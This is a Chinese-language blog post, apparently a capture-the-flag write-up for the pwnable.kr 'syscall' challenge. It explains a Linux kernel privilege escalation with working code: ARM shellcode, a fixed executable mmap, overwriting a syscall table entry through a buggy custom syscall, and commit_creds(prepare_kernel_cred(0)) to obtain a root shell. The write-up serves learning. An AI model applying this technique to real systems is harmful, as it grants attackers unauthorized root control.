---
title: pwnable.kr之syscall
author: rk700
layout: post
redirect_from: 
tags:
  - linux
  - exploit
  - kernel
  - pwnable.kr
---

这道题目提供了一个编写的内核模块源码，其中添加了一个syscall，其执行的逻辑基本与`strcpy()`相同，只是会将小写字母变为大写字母。

那么，这里的漏洞就很明显了，基本上就是一个向任意地址写任意内容的漏洞，只要写入的内容不包含小写字母。接下来，就是如何利用这个syscall，获取root权限，从而读取flag文件。

接下来，便对linux内核exploit进行简单的介绍。

---

在linux下，整个内存空间中，只有一部分低地址是进程可访问的，而高地址处则是属于内核。例如，在x86的机器上，`0x00000000`到`0xbfffffff`是属于进程的，而`0xc0000000`到`0xffffffff`这1 GB是属于内核的。

出于安全考虑，进程无法访问属于内核的内存，否则恶意进程就有可能对系统内核的内存进行读取或者篡改。反过来，属于进程的内存，是可以被内核访问的。特别地，在内核太可以跳转执行用户空间中的代码。（不过，在某些硬件上，比如较新的Core CPU，Intel加入了SMEP等保护功能，限制了内核执行用户空间代码的操作）

内核空间的exploit，本质上与用户空间的exploit是相同的：都是修改执行流程，达到我们的目的。一般来说，用户空间的exploit，其目的是获取shell；而内核空间的exploit，其目的则是提升权限，获取对系统的完全控制。

Linux系统下，每个进程拥有其对应的`struct cred`，用于记录该进程的uid。内核exploit的目的，便是修改当前进程的cred，从而提升权限。当然，进程本身是无法篡改自己的cred的，我们需要在内核空间中，通过以下方式来达到这一目的：

{% highlight c %}
commit_creds(prepare_kernel_cred(0));
{% endhighlight %}

其中，`prepare_kernel_cred()`创建一个新的cred，参数为0则将cred中的uid, gid设置为0，对应于root用户。随后，`commit_creds()`将这个cred应用于当前进程。此时，进程便提升到了root权限。

这些方法的地址，可以通过`/proc/kallsyms`获取。不过，有时为了安全，管理员会隐藏内核符号的地址，此时便无法通过这一方式获取地址。

提升权限后，我们还需要返回到用户空间。在这里，我们可以运行shell，从而以root身份执行任意命令了。

---

上面是对内核exploit的简要介绍。回到这道题目，整个利用的思路大致如下：

1. 在用户空间分配一片可执行的内存
2. 将shellcode写入这片内存
3. 利用提供的syscall 223，修改系统调用表的某一项，使其指向我们的shellcode
4. 调用被篡改的syscall，从而以内核态执行shellcode，完成提权
5. 调用`exec()`，得到shell

具体地，我们使用`mmap()`新建一片可执行的内存：

{% highlight c %}
void *src = 0x40801000;
void *res = mmap(src, 4096, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_FIXED|MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
{% endhighlight %}

由于syscall 223限制小写字符，所以我们选取了一个不包含小写字符的地址，并且使用`MAP_FIXED`选项，确保`mmap()`不会分配其他地址。此处还需留意传入的地址需要按页对齐。

接下来，我们通过`memcpy()`将我们的shellcode复制到这片内存：

{% highlight c %}
memcpy(res+0x10, shellcode, 28);
{% endhighlight %}

此时，`res+0x10`，即`0x40801010`，便是要放入系统调用表目标项的内容。为了避免对其他系统调用发生影响，我们选择syscall 223后面的224。

shellcode可以通过汇编得到，例如：

{% highlight bash %}
$ rasm2 -a arm 'mov r1, r4'
0410a0e1
{% endhighlight %}

shellcode的内容如下：

{% highlight c %}
char *shellcode = "\xf0\x4f\x2d\xe9" //push

                  "\x02\x40\xa0\xe1" //mov r4, r2

                  "\x31\xff\x2f\xe1" //blx r1

                  "\x04\x10\xa0\xe1" //mov r1, r4

                  "\x31\xff\x2f\xe1" //blx r1

                  "\xf0\x4f\xbd\xe8" //pop

                  "\x1e\xff\x2f\xe1"; //bx lr
{% endhighlight %}

所以，将0, `prepare_kernel_cred()`的地址，`commit_creds()`的地址作为参数，调用syscall 224，便完成了提权。幸运的是，`/proc/kallsyms`是可用的，从而其地址是可知的。

完成提权后，通过`exec()`执行`/bin/sh`，便得到了我们需要的root的shell。

